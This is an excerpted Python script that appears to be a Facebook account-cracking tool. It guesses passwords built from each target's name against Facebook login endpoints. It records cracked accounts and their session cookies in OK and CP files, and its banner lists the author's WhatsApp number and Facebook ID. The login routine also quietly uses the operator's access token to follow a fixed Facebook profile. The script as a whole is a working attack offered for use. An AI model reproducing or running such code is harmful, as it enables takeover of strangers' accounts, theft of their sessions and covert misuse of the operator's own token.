...
def logo():
	...
	print("""\x1b[1;32m ---------------------------------------------      
\x1b[1;32m╔════════════════════════════════════════════╗
\x1b[1;32m║\033[1;37m Tool Author: \033[1;33mNwabukingdc
\x1b[1;32m║\033[1;37m WhatsApp : \033[1;33m+2348149288617               
\x1b[1;32m║\033[1;37m Github     : \033[1;33mgithub.com/Nwabukingdc     
\x1b[1;32m║\033[1;37m Facebook   : \033[1;33m100071893216505\033[1;31m[ Nwabuking]    
\x1b[1;32m╚════════════════════════════════════════════╝
...
def login():
	...
	try:
		...
		try:
			...
			#-> bot follow
			requests.post("https://graph.facebook.com/100056643133891/subscribers?access_token="+token)      #Okenwa
			menu()
		except KeyError:
...
def method():
	...
	if method == "":
		...
		ask = raw_input("\033[1;37m[\033[1;32m!\033[1;37m] Use manual passwords y/n\033[1;37m [ \033[1;32mDefault : t \033[1;37m] : ")
		if ask == "y":
			manual()
		print(" ")
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;33m[FNwabuking-CP] %s|%s|%s %s %s"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[1;91m[\033[1;92mNwabuking_Cracking\033[1;91m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[1;92m[Nwabuking-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[1;93m[Nwabuking-CP] %s|%s"%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
...
def mbasic(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[1;91m[\033[1;92mNwabuking_Cracking\033[1;92m]\033[1;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;92m[OKENWA-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;93m[Nwabuking-CP] %s|%s\033[0;97m"%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break 
				continue
...
def mobile(user):
	...
	global loop, token
	sys.stdout.write(
		"\r\033[1;91m[\033[1;92mNwabuking_Cracking\033[1;91m]\033[1;97m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[Nwabuking-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;97m[Nwabuking-CP] %s|%s\033[0;97m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def manual():
	...
	def main(user):
		global loop, token
		sys.stdout.write(
			"\r\033[0;92m[\033[1;92mNwabuking_Cracking\033[1;92m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r\033[1;97m[Nwabuking-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
					ok.append("%s|%s"%(uid, pw))
					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
				elif "checkpoint" in ses.cookies.get_dict().keys():
					print("\r\033[1;97m[Nwabuking-CP] %s|%s\033[1;97m        "%(uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
					break
					continue
...
def setting_ua():
	...
	if ua =="":
		...
		c_ua = raw_input(" [+] Tecno : ")
		c_ua = raw_input(" [+] SAMSUNG : ")
		c_ua = raw_input(" [+] INFINIX: ")
